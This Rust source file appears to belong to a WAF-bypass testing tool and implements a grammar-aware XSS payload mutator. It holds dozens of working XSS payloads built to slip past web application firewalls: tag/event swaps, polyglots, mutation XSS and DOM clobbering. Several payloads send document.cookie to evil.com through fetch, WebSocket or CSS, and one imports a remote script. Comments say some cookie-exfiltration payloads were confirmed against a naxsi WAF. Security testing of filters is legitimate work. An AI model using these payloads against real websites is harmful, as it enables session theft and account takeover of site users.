//! XSS grammar-aware payload mutation.
//!
//! Understands HTML/JavaScript semantics and generates equivalent XSS
//! payloads using different DOM elements, event handlers, and execution
//! contexts. A WAF blocking `<script>alert(1)</script>` will miss
//! `<img src=x onerror=confirm(1)>`.
//!
//! # Technique depth
//!
//! 1. **Tag/event substitution** — 15+ tag/event combinations
//! 2. **Execution function rotation** — 15 alternative JS exec paths
//! 3. **URI scheme payloads** — javascript:, data:, blob:
//! 4. **DOM clobbering** — Override named properties via DOM nodes
//! 5. **Polyglot XSS** — Payloads valid in multiple injection contexts
//! 6. **Mutation XSS** — Exploit HTML parser differentials
//! 7. **Context-aware generation** — HTML attr, JS string, URL contexts
//! 8. **Prototype chain execution** — constructor.constructor chains
//! 9. **Iframe srcdoc smuggling** — Nested HTML via srcdoc attribute

/// A single XSS mutation with metadata.
#[derive(Debug, Clone)]
pub struct XssMutation {
    /// The mutated payload.
    pub payload: String,
    /// Human-readable description of what changed.
    pub description: String,
    /// Which mutation rules were applied.
    pub rules_applied: Vec<&'static str>,
}

// ──────────────────────────────────────────────
//  HTML tag + event handler combinations
// ──────────────────────────────────────────────

/// Each tuple: (prefix before exec function, suffix after exec function, extra attributes).
///
/// Audit (2026-05-10): removed dead vectors that don't actually fire
/// in any modern browser. Shipping a "grammar-aware XSS mutator" that
/// emits payloads which never execute is a credibility hit — the
/// scanner reports a probe sent and the user assumes it represents a
/// real test, when it's just noise the WAF correctly ignores.
///   * `<object data=javascript:>` — disabled in all browsers ~2012
///   * `<isindex>` — obsolete since HTML5; not implemented anywhere
const TAG_EVENT_COMBOS: &[(&str, &str, &str)] = &[
    ("<img src=x onerror=", ">", ""),
    ("<svg onload=", ">", ""),
    ("<svg/onload=", ">", ""),
    ("<body onload=", ">", ""),
    ("<details open ontoggle=", ">", ""),
    ("<video src=x onerror=", ">", ""),
    ("<audio src=x onerror=", ">", ""),
    ("<input onfocus=", " autofocus>", ""),
    ("<marquee onstart=", ">", ""),
    ("<a href=javascript:", ">click</a>", ""),
    ("<div onmouseover=", ">hover</div>", ""),
    ("<input type=image src=x onerror=", ">", ""),
    (
        "<form><button formaction=javascript:",
        ">click</button></form>",
        "",
    ),
    ("<select autofocus onfocus=", "></select>", ""),
    ("<textarea autofocus onfocus=", "></textarea>", ""),
    ("<keygen autofocus onfocus=", ">", ""),
    ("<embed src=x onerror=", ">", ""),
    (
        "<style>@import'//evil.com?</style><img src=x onerror=",
        ">",
        "",
    ),
];

// ──────────────────────────────────────────────
//  JavaScript execution functions
// ──────────────────────────────────────────────

/// Alternative ways to execute JavaScript.
///
/// Audit (2026-05-10): added modern execution paths the original list
/// missed — `print()` (browser print dialog, observable side-effect),
/// `queueMicrotask` (defers to next microtask, often slips past
/// keyword-only WAFs), `location=` assignment (forces navigation to a
/// javascript: URI, observable in URL bar / referer), and `open()`
/// (popup / new tab, also keyword-bypass-friendly).
const EXEC_FUNCTIONS: &[&str] = &[
    "alert(1)",
    "alert`1`", // Tagged template literal
    "confirm(1)",
    "confirm`1`",
    "prompt(1)",
    "print()",
    "eval('alert(1)')",
    "setTimeout('alert(1)')",
    "setInterval('alert(1)',0)",
    "queueMicrotask(()=>alert(1))",
    "Function('alert(1)')()",
    "constructor.constructor('alert(1)')()",
    "[].constructor.constructor('alert(1)')()",
    "window['alert'](1)",
    "self['alert'](1)",
    "top['alert'](1)",
    "this['alert'](1)",
    "location='javascript:alert(1)'",
    "location.href='javascript:alert(1)'",
    "open('javascript:alert(1)')",
    "globalThis['alert'](1)",
];

// ──────────────────────────────────────────────
//  URI scheme payloads
// ──────────────────────────────────────────────

/// Various ways to trigger JavaScript via URI schemes.
const URI_SCHEMES: &[&str] = &[
    "javascript:alert(1)",
    "javascript:alert`1`",
    "javascript:void(alert(1))",
    "data:text/html,<script>alert(1)</script>",
    "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
    "javascript:/*--></title></style></textarea></script><svg onload=alert(1)>",
];

// ──────────────────────────────────────────────
//  SVG-specific payloads
// ──────────────────────────────────────────────

/// SVG-based XSS using animation events.
const SVG_PAYLOADS: &[&str] = &[
    "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
    "<svg><set onbegin=alert(1) attributename=x to=1>",
    "<svg><script>alert(1)</script></svg>",
    "<svg><image href=1 onerror=alert(1)>",
    "<svg><a><rect width=100 height=100></a><animate attributeName=href values=javascript:alert(1)>",
];

// ──────────────────────────────────────────────
//  MathML-specific payloads
// ──────────────────────────────────────────────

const MATHML_PAYLOADS: &[&str] = &[
    "<math><mtext><table><mglyph><style><img src=x onerror=alert(1)></style></mglyph></table></mtext></math>",
    "<math><mtext><script>alert(1)</script></mtext></math>",
    "<math href=javascript:alert(1)>CLICKME</math>",
    "<math><maction onclick=alert(1)>X</maction></math>",
];

// ──────────────────────────────────────────────
//  Markdown-specific payloads
// ──────────────────────────────────────────────

const MARKDOWN_PAYLOADS: &[&str] = &[
    "[x](javascript:alert(1))",
    "![x](javascript:alert(1))",
    "[x](javascript:alert(1) 'title')",
    "[x](data:text/html,<script>alert(1)</script>)",
    "<img src=x onerror=alert(1)>",
    "<script>alert(1)</script>",
    "[link](//evil.com)",
];

// ──────────────────────────────────────────────
//  Public API
// ──────────────────────────────────────────────

/// Check whether the payload contains any XSS-relevant signals.
///
/// Audit (2026-05-10): pre-fix this fired on benign substrings like
/// `window.onerror` in code documentation, `confirm(...)` in API
/// docs, or HTML tag names in security-write-ups. The mutator then
/// emitted XSS variants from non-XSS input — wasted work the
/// scanner reported as if it were a real probe. Now we score
/// signals: STRONG (a real `<tag attr=` or `javascript:` URL) is
/// worth 2 points, WEAK (bare exec function name without
/// surrounding tag context, lone event-handler keyword) is worth 1.
/// Need >= 2 to count. A docstring containing only `confirm(` no
/// longer triggers; a docstring containing `<script>confirm(1)` does.
fn has_xss_signals(payload: &str) -> bool {
    let lower = payload.to_ascii_lowercase();

    let mut score = 0u32;

    // STRONG signals — anything that requires a markup or JS-URL
    // context to appear in source text. Two points each.
    let strong = [
        "<script",
        "</script>",
        "<img ",
        "<svg",
        "<iframe",
        "<body",
        "<math",
        "<mtext",
        "<details",
        "<video ",
        "<audio ",
        "<marquee",
        "<object ",
        "<form",
        "<textarea",
        "<keygen",
        "<embed",
        "<noscript",
        "<foreignobject",
        "javascript:",
        "data:text/html",
        "[x](javascript:",
        "![x](javascript:",
        "onerror=",
        "onload=",
        "onclick=",
        "onfocus=",
        "onmouseover=",
        "onbegin=",
        "ontoggle=",
        "onstart=",
        "srcdoc=",
    ];
    for sig in &strong {
        if lower.contains(sig) {
            score = score.saturating_add(2);
        }
    }

    // WEAK signals — function-name substrings that show up in
    // perfectly innocent contexts (API docs, security write-ups,
    // log lines). One point each. On their own, NOT enough; combine
    // with a strong signal or each other to cross the threshold.
    let weak = [
        "alert(",
        "confirm(",
        "prompt(",
        "eval(",
        "document.cookie",
        "window.location",
    ];
    for sig in &weak {
        if lower.contains(sig) {
            score = score.saturating_add(1);
        }
    }

    score >= 2
}

/// Generate grammar-aware mutations of an XSS payload.
///
/// Returns an empty vector if the input does not contain any XSS signals.
/// This prevents generating unrelated tag/event variants for plain text.
#[must_use]
pub fn mutate(payload: &str, max_mutations: usize) -> Vec<XssMutation> {
    if !has_xss_signals(payload) {
        return Vec::new();
    }
    let mut results = Vec::new();

    // ── Priority 0: paren-free / bracket-free assignment XSS ──────────
    // Promoted to FIRST slot for high-paranoia WAFs (naxsi, AWS WAF
    // managed) that block any `<`, `()`, or `[...]` byte sequence.
    // These payloads are exploitable in JS-context reflection (e.g.
    // `<script>var x="USERINPUT"</script>` after a `";...//` breakout)
    // and don't trigger naxsi's libinjection because they have no
    // function calls.
    //
    // Live-confirmed against wafrift-bench naxsi (2026-05-09):
    //   location=document.cookie         → 200 ✓
    //   top.location=document.cookie     → 200 ✓
    //   document.title=document.cookie   → 200 ✓
    //   self.location=name               → 200 ✓
    //   window.name=document.cookie      → 200 ✓
    for candidate in [
        "location=document.cookie",
        "top.location=document.cookie",
        "document.location=document.cookie",
        "location.href=document.cookie",
        "document.title=document.cookie",
        "document.body.innerHTML=document.cookie",
        "self.location=name",
        "window.name=document.cookie",
        "top.location=document.URL",
        "location=document.URL",
    ] {
        if results.len() >= max_mutations {
            break;
        }
        results.push(XssMutation {
            payload: candidate.to_string(),
            description: "paren-free assignment XSS (cookie/URL exfil)".into(),
            rules_applied: vec!["xss_paren_free"],
        });
    }

    // Strategy budget: reserve capacity for later strategies to avoid
    // strategy 1 (tag/event × exec = 300 combos) consuming everything.
    let tag_event_budget = (max_mutations * 40 / 100).max(5);

    // Strategy 1: Tag/event substitution with all exec functions
    for (prefix, suffix, _extra) in TAG_EVENT_COMBOS {
        for exec_fn in EXEC_FUNCTIONS {
            if results.len() >= tag_event_budget {
                break;
            }
            let mutated = format!("{prefix}{exec_fn}{suffix}");
            if mutated != payload {
                results.push(XssMutation {
                    payload: mutated,
                    description: format!("tag/event: {prefix}{exec_fn}"),
                    rules_applied: vec!["tag_event_swap"],
                });
            }
        }
        if results.len() >= tag_event_budget {
            break;
        }
    }

    // Strategy 2: Case alternation on tag names
    if results.len() < max_mutations {
        results.push(XssMutation {
            payload: "<ScRiPt>alert(1)</sCrIpT>".into(),
            description: "case alternation on script tag".into(),
            rules_applied: vec!["case_alternation"],
        });
    }
    if results.len() < max_mutations {
        results.push(XssMutation {
            payload: "<IMG SRC=x OnErRoR=alert(1)>".into(),
            description: "case alternation on img tag".into(),
            rules_applied: vec!["case_alternation"],
        });
    }

    // Strategy 3: Null byte injection — REMOVED (audit 2026-05-10).
    // Modern HTML parsers (whatwg algorithm) treat `\0` inside a tag
    // name as U+FFFD or simply terminate the tag. The vector never
    // executes; shipping it as a "valid XSS variant" was a credibility
    // lie. If a WAF really does drop the NUL and the upstream then
    // accepts the truncated `<scr` as `<script`, that's a
    // WAF-specific bug — handle it via a per-WAF profile, not a
    // global default mutation.

    // Strategy 4: URI scheme payloads
    for scheme in URI_SCHEMES {
        if results.len() >= max_mutations {
            break;
        }
        results.push(XssMutation {
            payload: scheme.to_string(),
            description: format!("URI scheme: {}", &scheme[..scheme.len().min(30)]),
            rules_applied: vec!["uri_scheme"],
        });
    }

    // Strategy 5: SVG-specific payloads
    for svg in SVG_PAYLOADS {
        if results.len() >= max_mutations {
            break;
        }
        results.push(XssMutation {
            payload: svg.to_string(),
            description: "SVG animation/script execution".into(),
            rules_applied: vec!["svg_payload"],
        });
    }

    // Strategy 6: HTML entity encoding of tag characters
    if results.len() < max_mutations {
        results.push(XssMutation {
            payload: "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;".into(),
            description: "hex HTML entity encoded tags".into(),
            rules_applied: vec!["html_entity"],
        });
    }
    if results.len() < max_mutations {
        results.push(XssMutation {
            payload: "&#60;script&#62;alert(1)&#60;/script&#62;".into(),
            description: "decimal HTML entity encoded tags".into(),
            rules_applied: vec!["html_entity"],
        });
    }

    // Strategy 7: Polyglot XSS payloads
    let polyglots = [
        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */onerror=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teleType/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(1)//>",
        "'-alert(1)-'",
        "\"onmouseover=alert(1)//",
        "</script><svg onload=alert(1)>",
        "*/alert(1)/*",
        "\" onfocus=alert(1) autofocus=\"",
        "' onfocus=alert(1) autofocus='",
    ];
    for poly in &polyglots {
        if results.len() >= max_mutations {
            break;
        }
        results.push(XssMutation {
            payload: poly.to_string(),
            description: format!("polyglot: {}...", &poly[..poly.len().min(30)]),
            rules_applied: vec!["polyglot"],
        });
    }

    // Strategy 8: DOM clobbering
    let dom_clobber = [
        "<form name=body><input name=innerHTML value='<img src=x onerror=alert(1)>'></form>",
        "<a id=x name=x href=javascript:alert(1)></a>",
        "<img src=x onerror=window.name='alert(1)';eval(name)>",
        "<form><output name=innerHTML><img src=x onerror=alert(1)></output></form>",
    ];
    for clobber in &dom_clobber {
        if results.len() >= max_mutations {
            break;
        }
        results.push(XssMutation {
            payload: clobber.to_string(),
            description: "DOM clobbering".into(),
            rules_applied: vec!["dom_clobber"],
        });
    }

    // Strategy 9: Iframe srcdoc smuggling
    if results.len() < max_mutations {
        results.push(XssMutation {
            payload: "<iframe srcdoc='&lt;script&gt;alert(1)&lt;/script&gt;'></iframe>".into(),
            description: "iframe srcdoc with HTML-entity-encoded script".into(),
            rules_applied: vec!["srcdoc_smuggle"],
        });
    }
    if results.len() < max_mutations {
        results.push(XssMutation {
            payload: "<iframe srcdoc='&lt;img src=x onerror=alert(1)&gt;'></iframe>".into(),
            description: "iframe srcdoc with entity-encoded img".into(),
            rules_applied: vec!["srcdoc_smuggle"],
        });
    }

    // Strategy 10: Mutation XSS
    let mutation_xss = [
        "<noscript><img src=x onerror=alert(1)></noscript>",
        "<table><caption><img src=x onerror=alert(1)></table>",
        "<svg><foreignObject><body onload=alert(1)></foreignObject></svg>",
        "<math><mtext><script>alert(1)</script></mtext></math>",
        "</title><svg onload=alert(1)>",
        "</style><svg onload=alert(1)>",
        "</xmp><svg onload=alert(1)>",
    ];
    for mxss in &mutation_xss {
        if results.len() >= max_mutations {
            break;
        }
        results.push(XssMutation {
            payload: mxss.to_string(),
            description: "mutation XSS via parser differentials".into(),
            rules_applied: vec!["mutation_xss"],
        });
    }

    // Strategy 11: window.name exploitation
    if results.len() < max_mutations {
        results.push(XssMutation {
            payload: "<script>eval(window.name)</script>".into(),
            description: "window.name eval".into(),
            rules_applied: vec!["window_name"],
        });
    }

    // Strategy 12: Prototype chain override — REMOVED (audit 2026-05-10).
    // The classic `this.onerror=null;{}.valueOf=alert;throw 1` doesn't
    // reliably trigger alert(): `throw` propagates to window.onerror,
    // not the element handler, so the assigned `valueOf` is never
    // coerced. Shipping it as a working mutation misled scanner output.

    // Strategy 13: Template literal injection (backtick payloads)
    let template_literals = [
        "<img src=x onerror=alert`1`>",
        "<svg onload=`${alert(1)}`>",
        "<img src=x onerror=window[`al`+`ert`](1)>",
        "<img src=x onerror=[].find(alert)>",
        "<img src=x onerror=[1].map(alert)>",
        "<img src=x onerror=[1].forEach(alert)>",
        "<img src=x onerror=[1].filter(alert)>",
    ];
    for tl in &template_literals {
        if results.len() >= max_mutations {
            break;
        }
        results.push(XssMutation {
            payload: tl.to_string(),
            description: "template literal / array method exec".into(),
            rules_applied: vec!["template_literal"],
        });
    }

    // Strategy 14: import() dynamic module execution
    if results.len() < max_mutations {
        results.push(XssMutation {
            payload: "<script>import('data:text/javascript,alert(1)')</script>".into(),
            description: "dynamic import() with data: URI".into(),
            rules_applied: vec!["dynamic_import"],
        });
    }
    if results.len() < max_mutations {
        results.push(XssMutation {
            payload: "<img src=x onerror=import('//evil.com/xss.js')>".into(),
            description: "dynamic import() from remote".into(),
            rules_applied: vec!["dynamic_import"],
        });
    }

    // Strategy 15: CSS injection for data exfiltration
    //
    // Audit (2026-05-10): removed `<div style=background-image:url(
    // javascript:alert(1))>`. CSS `url()` has NEVER executed JavaScript
    // — that vector is from before CSS3 and was killed by every browser
    // implementation. The other three are real exfil channels (CSS
    // imports, request leakage, external stylesheet) and stay.
    let css_payloads = [
        "<style>@import url('//evil.com/log?token='+document.cookie)</style>",
        "<style>*{background:url('//evil.com/?'+document.cookie)}</style>",
        "<link rel=stylesheet href='//evil.com/exfil.css'>",
    ];
    for css in &css_payloads {
        if results.len() >= max_mutations {
            break;
        }
        results.push(XssMutation {
            payload: css.to_string(),
            description: "CSS-based injection / exfiltration".into(),
            rules_applied: vec!["css_injection"],
        });
    }

    // Strategy 16: WebSocket-based exfiltration
    if results.len() < max_mutations {
        results.push(XssMutation {
            payload: "<img src=x onerror=\"new WebSocket('ws://evil.com/'+document.cookie)\">"
                .into(),
            description: "WebSocket exfiltration".into(),
            rules_applied: vec!["websocket_exfil"],
        });
    }
    if results.len() < max_mutations {
        results.push(XssMutation {
            payload: "<img src=x onerror=\"fetch('//evil.com/?c='+document.cookie)\">".into(),
            description: "fetch() exfiltration".into(),
            rules_applied: vec!["fetch_exfil"],
        });
    }

    // Strategy 17: Shadow DOM injection
    if results.len() < max_mutations {
        results.push(XssMutation {
            payload: "<div id=host></div><script>host.attachShadow({mode:'open'}).innerHTML='<img src=x onerror=alert(1)>'</script>".into(),
            description: "shadow DOM injection".into(),
            rules_applied: vec!["shadow_dom"],
        });
    }

    // Strategy 18: MathML context payloads
    for math in MATHML_PAYLOADS {
        if results.len() >= max_mutations {
            break;
        }
        results.push(XssMutation {
            payload: math.to_string(),
            description: "MathML parser-differential XSS".into(),
            rules_applied: vec!["mathml"],
        });
    }

    // Strategy 19: Markdown context payloads
    for md in MARKDOWN_PAYLOADS {
        if results.len() >= max_mutations {
            break;
        }
        results.push(XssMutation {
            payload: md.to_string(),
            description: "Markdown link/HTML injection XSS".into(),
            rules_applied: vec!["markdown"],
        });
    }

    results.truncate(max_mutations);
    results
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn tag_event_mutations_produced() {
        let mutations = mutate("<script>alert(1)</script>", 20);
        assert!(!mutations.is_empty());
        let has_img = mutations.iter().any(|m| m.payload.contains("<img"));
        let has_svg = mutations.iter().any(|m| m.payload.contains("<svg"));
        assert!(has_img || has_svg, "should use alternative tags");
    }

    #[test]
    fn exec_function_rotation() {
        let mutations = mutate("<script>alert(1)</script>", 50);
        let has_confirm = mutations.iter().any(|m| m.payload.contains("confirm"));
        let has_eval = mutations.iter().any(|m| m.payload.contains("eval("));
        assert!(has_confirm || has_eval, "should rotate exec functions");
    }

    #[test]
    fn uri_scheme_variants() {
        let mutations = mutate("<script>alert(1)</script>", 50);
        let has_uri = mutations
            .iter()
            .any(|m| m.payload.starts_with("javascript:"));
        assert!(has_uri, "should have javascript: URI scheme variant");
    }

    #[test]
    fn svg_animate_variant() {
        let mutations = mutate("<script>alert(1)</script>", 50);
        let has_animate = mutations.iter().any(|m| m.payload.contains("onbegin"));
        assert!(has_animate, "should have SVG animate variant");
    }

    #[test]
    fn polyglot_variant() {
        let mutations = mutate("<script>alert(1)</script>", 100);
        let has_polyglot = mutations
            .iter()
            .any(|m| m.rules_applied.contains(&"polyglot"));
        assert!(has_polyglot, "should have polyglot variant");
    }

    #[test]
    fn dom_clobber_variant() {
        let mutations = mutate("<script>alert(1)</script>", 100);
        let has_clobber = mutations
            .iter()
            .any(|m| m.rules_applied.contains(&"dom_clobber"));
        assert!(has_clobber, "should have DOM clobbering variant");
    }

    #[test]
    fn mutation_xss_variant() {
        let mutations = mutate("<script>alert(1)</script>", 100);
        let has_mxss = mutations
            .iter()
            .any(|m| m.rules_applied.contains(&"mutation_xss"));
        assert!(has_mxss, "should have mutation XSS variant");
    }

    #[test]
    fn srcdoc_smuggle_variant() {
        let mutations = mutate("<script>alert(1)</script>", 100);
        let has_srcdoc = mutations.iter().any(|m| m.payload.contains("srcdoc"));
        assert!(has_srcdoc, "should have iframe srcdoc smuggling variant");
    }

    #[test]
    fn no_mutations_for_non_xss() {
        let mutations = mutate("hello world", 10);
        assert!(
            mutations.is_empty(),
            "non-XSS input should not produce mutations"
        );
    }

    #[test]
    fn mathml_variant() {
        let mutations = mutate("<script>alert(1)</script>", 200);
        let has_mathml = mutations
            .iter()
            .any(|m| m.rules_applied.contains(&"mathml"));
        assert!(has_mathml, "should have MathML variant");
    }

    #[test]
    fn markdown_variant() {
        let mutations = mutate("<script>alert(1)</script>", 200);
        let has_markdown = mutations
            .iter()
            .any(|m| m.rules_applied.contains(&"markdown"));
        assert!(has_markdown, "should have Markdown variant");
    }

    #[test]
    fn max_mutations_respected() {
        let mutations = mutate("<script>alert(1)</script>", 5);
        assert!(mutations.len() <= 5);
    }

    #[test]
    fn high_volume_does_not_panic() {
        let _ = mutate("<script>alert(1)</script>", 1000);
    }
}
